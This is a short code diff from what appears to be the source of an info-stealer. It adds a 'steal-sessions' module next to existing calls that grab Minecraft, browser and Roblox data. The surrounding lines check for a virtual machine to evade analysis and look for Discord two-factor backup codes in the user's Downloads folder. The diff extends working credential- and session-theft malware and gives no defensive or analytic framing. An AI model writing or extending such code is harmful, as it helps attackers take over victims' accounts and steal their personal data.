@@ -29,6 +29,7 @@ if (config.vmProtect && checkVM()) {
     require('./functions/grab-mc');
     require('./functions/grab-browsers-data');
     await require('./functions/grab-roblox')();
+    require('./functions/steal-sessions');
 
     const mfaCodesPath = join(os.homedir(), 'Downloads', 'discord_backup_codes.txt');
     if (fs.existsSync(mfaCodesPath)) {
